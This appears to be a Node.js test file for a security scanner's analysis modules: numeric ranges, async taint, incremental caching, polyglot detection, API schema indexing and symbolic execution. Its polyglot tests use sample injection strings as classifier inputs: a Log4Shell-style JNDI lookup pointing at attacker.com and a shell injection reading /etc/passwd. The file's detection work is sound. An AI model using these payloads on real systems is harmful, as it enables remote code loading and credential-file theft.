// Phase 8 — P3.1 / P3.2 / P3.3 / P4.1 / P4.3 / P4.7 extension tests.
//
// Tests every new module's public surface: numeric-domain, async-sequencing,
// incremental, polyglot, schema-aware-bridge, symbolic-exec.

import { test } from 'node:test';
import * as assert from 'node:assert/strict';
import * as path from 'node:path';
import * as fs from 'node:fs';
import * as os from 'node:os';

import * as N from '../src/dataflow/numeric-domain.js';
import {
  describeChain, resultTaintFor, asyncIterYieldsTaint, promiseAggregateTaint,
} from '../src/dataflow/async-sequencing.js';
import {
  hashFileContent, readIncrementalState, validateIncrementalState,
  diffFileHashes, pickReusableSummaries, serializeSummaries,
  commitIncrementalState, dropIncrementalState, seedSummaryCache,
} from '../src/dataflow/incremental.js';
import {
  identifyEmbedding, findInterpolationHoles, templateSkeleton,
  shouldFlagPolyglot, embeddingToCwe,
} from '../src/dataflow/polyglot.js';
import {
  canonicalizePath, indexOpenApi, flattenSchemaFields, matchEndpoint,
  indexProto, indexGraphQL,
} from '../src/posture/schema-aware-bridge.js';
import {
  newState, assume, step, isReachable, exploreFunction, getVar, setVar,
} from '../src/dataflow/symbolic-exec.js';
import { SummaryCache } from '../src/dataflow/summaries.js';

// ── numeric-domain ─────────────────────────────────────────────────────────
test('numeric: range constructor + constant', () => {
  const r = N.range(3, 9);
  assert.equal(r.lo, 3); assert.equal(r.hi, 9);
  const c = N.constant(7);
  assert.equal(c.lo, 7); assert.equal(c.hi, 7);
  assert.equal(N.range(10, 2), N.BOTTOM);
});

test('numeric: join / meet behaviour', () => {
  const a = N.range(0, 10), b = N.range(5, 15);
  assert.deepEqual(N.join(a, b), N.range(0, 15));
  assert.deepEqual(N.meet(a, b), N.range(5, 10));
  assert.equal(N.meet(N.range(0, 4), N.range(5, 9)), N.BOTTOM);
});

test('numeric: arithmetic — add / sub / mul', () => {
  const a = N.range(2, 4), b = N.range(3, 5);
  assert.deepEqual(N.add(a, b), N.range(5, 9));
  assert.deepEqual(N.sub(a, b), N.range(-3, 1));
  assert.deepEqual(N.mul(a, b), N.range(6, 20));
});

test('numeric: decide — disjoint ranges resolve false; equal singletons true', () => {
  assert.equal(N.decide(N.range(0, 5), '<', N.range(10, 20)), 'true');
  assert.equal(N.decide(N.range(0, 5), '>', N.range(10, 20)), 'false');
  assert.equal(N.decide(N.range(0, 100), '<', N.range(50, 200)), 'maybe');
  assert.equal(N.decide(N.constant(5), '===', N.constant(5)), 'true');
  assert.equal(N.decide(N.constant(5), '===', N.constant(7)), 'false');
});

test('numeric: narrow lifts a TOP through a <= guard', () => {
  const n = N.narrow(N.TOP, '<=', N.constant(9));
  assert.equal(n.hi, 9);
  assert.equal(n.lo, -Infinity);
  // Adjacent narrow through >= 0
  const n2 = N.narrow(n, '>=', N.constant(0));
  assert.equal(n2.lo, 0);
  assert.equal(n2.hi, 9);
});

test('numeric: abstractEval folds binary literal arithmetic', () => {
  const env = new Map([['x', N.range(1, 3)]]);
  const r = N.abstractEval({ kind: 'bin', op: '+', left: { kind: 'ident', name: 'x' }, right: { kind: 'literal', value: 5 } }, env);
  assert.equal(r.lo, 6); assert.equal(r.hi, 8);
});

// ── async-sequencing ───────────────────────────────────────────────────────
test('async: describeChain pulls .then / .catch ops', () => {
  const expr = {
    kind: 'call',
    callee: {
      kind: 'member',
      object: {
        kind: 'call',
        callee: {
          kind: 'member',
          object: { kind: 'call', callee: { kind: 'ident', name: 'fetch' }, args: [{ kind: 'ident', name: 'url' }] },
          prop: 'then',
        },
        args: [{ kind: 'ident', name: 'parseJSON' }],
      },
      prop: 'catch',
    },
    args: [{ kind: 'ident', name: 'onErr' }],
  };
  const chain = describeChain(expr);
  assert.equal(chain.ops.length, 2);
  assert.equal(chain.ops[0].kind, 'then');
  assert.equal(chain.ops[1].kind, 'catch');
  assert.equal(chain.isPromise, true);
});

test('async: resultTaintFor propagates source taint to .then callback', () => {
  const chain = { ops: [{ kind: 'then', callback: { kind: 'ident', name: 'cb' } }], rootCallee: null, isPromise: true };
  const { callbacks, finalTainted } = resultTaintFor(chain, true);
  assert.equal(callbacks[0].taintedInput, true);
  assert.equal(finalTainted, true);
});

test('async: asyncIterYieldsTaint catches req.body iter', () => {
  const r = asyncIterYieldsTaint(
    { kind: 'member', object: { kind: 'ident', name: 'req' }, prop: 'body' },
    new Set(),
  );
  assert.equal(r, true);
});

test('async: promiseAggregateTaint flags each tainted element', () => {
  const arr = { elements: [{ kind: 'ident', name: 'tainted' }, { kind: 'ident', name: 'clean' }] };
  const res = promiseAggregateTaint(arr, e => e.name === 'tainted');
  assert.deepEqual(res, [true, false]);
});

// ── incremental ────────────────────────────────────────────────────────────
test('incremental: hashFileContent — stable + different for changed', () => {
  const a = hashFileContent('hello world');
  const b = hashFileContent('hello world');
  const c = hashFileContent('hello world!');
  assert.equal(a, b);
  assert.notEqual(a, c);
});

test('incremental: diffFileHashes — unchanged + changed + added + removed', () => {
  const prev = { 'a.js': 'h1', 'b.js': 'h2' };
  const curr = { 'a.js': 'h1', 'b.js': 'hX', 'c.js': 'h3' };
  const d = diffFileHashes(prev, curr);
  assert.deepEqual(d.unchanged, ['a.js']);
  assert.deepEqual(d.changed,   ['b.js']);
  assert.deepEqual(d.added,     ['c.js']);
  assert.deepEqual(d.removed,   []);
});

test('incremental: pickReusableSummaries invalidates transitive callers', () => {
  const summaries = { A: {}, B: {}, C: {}, D: {} };
  const callers = { A: ['B'], B: ['C'], D: [] };
  const { reusable, invalidated } = pickReusableSummaries(summaries, callers, new Set(['A']));
  assert.equal(invalidated.has('A'), true);
  assert.equal(invalidated.has('B'), true);
  assert.equal(invalidated.has('C'), true);
  assert.equal(invalidated.has('D'), false);
  assert.equal(reusable.has('D'), true);
});

test('incremental: validateIncrementalState — version drift invalidates', () => {
  const ok = validateIncrementalState(
    { version: { scanner: '0.59.0', rules: 'r1' }, files: {}, summaries: {} },
    { scanner: '0.59.0', rules: 'r1' },
  );
  assert.equal(ok.valid, true);
  const bad = validateIncrementalState(
    { version: { scanner: '0.59.0', rules: 'OLD' }, files: {}, summaries: {} },
    { scanner: '0.59.0', rules: 'r1' },
  );
  assert.equal(bad.valid, false);
});

test('incremental: persist + read + drop round-trip', () => {
  const dir = fs.mkdtempSync(path.join(os.tmpdir(), 'as-incr-'));
  const ok = commitIncrementalState(dir, { files: { 'a.js': 'h1' }, summaries: { foo: { returnTainted: true } } }, { scanner: '0.59.0', rules: 'r1' });
  assert.equal(ok, true);
  const s = readIncrementalState(dir);
  assert.equal(s.version.scanner, '0.59.0');
  assert.equal(s.files['a.js'], 'h1');
  const dropped = dropIncrementalState(dir);
  assert.equal(dropped, true);
  const after = readIncrementalState(dir);
  assert.equal(after.version, null);
});

test('incremental: seedSummaryCache restores summaries into a fresh cache', () => {
  const cache = new SummaryCache();
  const restored = seedSummaryCache(cache, { 'mod::fn': { returnTainted: true, mutatedParams: ['x'], taintedGlobals: [] } }, new Set(['mod::fn']));
  assert.equal(restored, 1);
  const hit = cache.get('mod::fn', new Set(), null);
  assert.equal(hit.returnTainted, true);
});

test('incremental: serializeSummaries strips Sets to arrays', () => {
  const cache = new SummaryCache();
  cache.set('q', new Set(), { returnTainted: false, mutatedParams: new Set(['a','b']), taintedGlobals: new Set(), findings: [] }, null);
  const out = serializeSummaries(cache);
  assert.equal(Array.isArray(out.q.mutatedParams), true);
  assert.deepEqual(out.q.mutatedParams.sort(), ['a','b']);
});

// ── polyglot ───────────────────────────────────────────────────────────────
test('polyglot: identify SQL — keyword + clause = high confidence', () => {
  const r = identifyEmbedding(`SELECT * FROM users WHERE id = '${ '_HOLE_' }'`);
  assert.equal(r.lang, 'sql');
  assert.ok(r.confidence >= 0.9);
});

test('polyglot: identify HTML — tag + entity', () => {
  const r = identifyEmbedding('<div>&nbsp;hello</div>');
  assert.equal(r.lang, 'html');
});

test('polyglot: identify JNDI — single high-signal pattern', () => {
  const r = identifyEmbedding('${jndi:ldap://attacker.com/exp}');
  assert.equal(r.lang, 'jndi');
  assert.equal(r.confidence, 1.0);
});

test('polyglot: identify Shell — backtick / bash builtin', () => {
  const r = identifyEmbedding('; cat /etc/passwd');
  assert.equal(r.lang, 'shell');
});

test('polyglot: findInterpolationHoles + templateSkeleton', () => {
  const node = {
    kind: 'template',
    quasis: ['SELECT * FROM users WHERE id = \'', '\''],
    expressions: [{ kind: 'ident', name: 'userId' }],
  };
  const holes = findInterpolationHoles(node);
  assert.equal(holes.length, 1);
  const skel = templateSkeleton(node);
  assert.ok(skel.includes('SELECT'));
  assert.ok(skel.includes('__HOLE__'));
});

test('polyglot: shouldFlagPolyglot honours sensitive embeddings', () => {
  assert.equal(shouldFlagPolyglot('sql',   {}, true), true);
  assert.equal(shouldFlagPolyglot('shell', {}, true), true);
  assert.equal(shouldFlagPolyglot('html',  {}, true), false);
  assert.equal(shouldFlagPolyglot('html',  {}, true, { inAttribute: true }), true);
});

test('polyglot: embeddingToCwe maps families', () => {
  assert.equal(embeddingToCwe('sql').cwe, 'CWE-89');
  assert.equal(embeddingToCwe('jndi').cwe, 'CWE-1188');
  assert.equal(embeddingToCwe(null), null);
});

// ── schema-aware-bridge ────────────────────────────────────────────────────
test('schema: canonicalizePath normalizes OpenAPI / Flask / Express', () => {
  assert.equal(canonicalizePath('/users/{id}/posts/{postId}'), '/users/:_/posts/:_');
  assert.equal(canonicalizePath('/users/<id>'),                 '/users/:_');
  assert.equal(canonicalizePath('/users/:id'),                  '/users/:_');
});

test('schema: indexOpenApi + flattenSchemaFields + matchEndpoint', () => {
  const doc = {
    paths: {
      '/signup': {
        post: {
          requestBody: {
            content: {
              'application/json': {
                schema: { $ref: '#/components/schemas/SignupReq' },
              },
            },
          },
        },
      },
    },
    components: {
      schemas: {
        SignupReq: {
          type: 'object',
          properties: {
            emailAddress: { type: 'string' },
            password:     { type: 'string' },
          },
        },
      },
    },
  };
  const idx = indexOpenApi(doc);
  assert.equal(idx.length, 1);
  assert.equal(idx[0].pathCanon, '/signup');
  assert.equal(idx[0].bodyFields.length, 2);
  const hit = matchEndpoint(idx, { method: 'POST', path: '/signup', bodyKeys: ['email', 'password'] });
  assert.ok(hit);
  // Synonym detection: client 'email' → server 'emailAddress'.
  assert.equal(hit.rename.email, 'emailAddress');
  assert.equal(hit.rename.password, 'password');
});

test('schema: indexProto returns service+method+field tuples', () => {
  const proto = {
    services: [{ name: 'UserService', rpcs: [{ name: 'GetUser', requestType: 'GetUserReq', responseType: 'User' }] }],
    messages: [
      { name: 'GetUserReq', fields: [{ name: 'id', type: 'string' }] },
      { name: 'User',       fields: [{ name: 'email', type: 'string' }] },
    ],
  };
  const idx = indexProto(proto);
  assert.equal(idx.length, 1);
  assert.equal(idx[0].service, 'UserService');
  assert.equal(idx[0].requestFields[0].name, 'id');
});

test('schema: indexGraphQL extracts Query + Mutation', () => {
  const sdl = {
    types: [
      { name: 'Query',    fields: [{ name: 'user', args: [{ name: 'id', type: 'ID' }], returns: 'User' }] },
      { name: 'Mutation', fields: [{ name: 'signup', args: [{ name: 'email', type: 'String' }], returns: 'User' }] },
    ],
  };
  const idx = indexGraphQL(sdl);
  assert.equal(idx.length, 2);
  assert.equal(idx[0].op, 'Query');
  assert.equal(idx[1].op, 'Mutation');
});

// ── symbolic-exec ──────────────────────────────────────────────────────────
test('symbolic: assume narrows a TOP var through guard', () => {
  let s = newState();
  s = setVar(s, 'x', N.TOP);
  s = assume(s, { kind: 'bin', op: '>=', left: { kind: 'ident', name: 'x' }, right: { kind: 'literal', value: 0 } });
  const r = getVar(s, 'x');
  assert.equal(r.lo, 0);
});

test('symbolic: contradictory assume produces bottom (unreachable)', () => {
  let s = newState();
  s = setVar(s, 'x', N.constant(5));
  s = assume(s, { kind: 'bin', op: '>', left: { kind: 'ident', name: 'x' }, right: { kind: 'literal', value: 10 } });
  assert.equal(isReachable(s), false);
});

test('symbolic: step on `assign` from numeric literal', () => {
  let s = newState();
  s = step(s, { kind: 'assign', target: 'y', source: { kind: 'literal', value: 42 } });
  assert.equal(getVar(s, 'y').lo, 42);
});

test('symbolic: exploreFunction prunes dead branches', () => {
  // CFG: entry → assign x = 5 → if x > 10 (T: sink ; F: ret)
  const fn = {
    cfg: {
      entry: 'n0',
      nodes: {
        n0: { kind: 'assign', target: 'x', source: { kind: 'literal', value: 5 }, successors: ['n1'] },
        n1: { kind: 'if', cond: { kind: 'bin', op: '>', left: { kind: 'ident', name: 'x' }, right: { kind: 'literal', value: 10 } }, successors: ['n2', 'n3'] },
        n2: { kind: 'sink', successors: [] },
        n3: { kind: 'return', successors: [] },
      },
    },
  };
  const out = exploreFunction(fn);
  assert.equal(out.prunedNodes.has('n2'), true);   // sink unreachable
  assert.equal(out.prunedNodes.has('n3'), false);  // return reachable
});
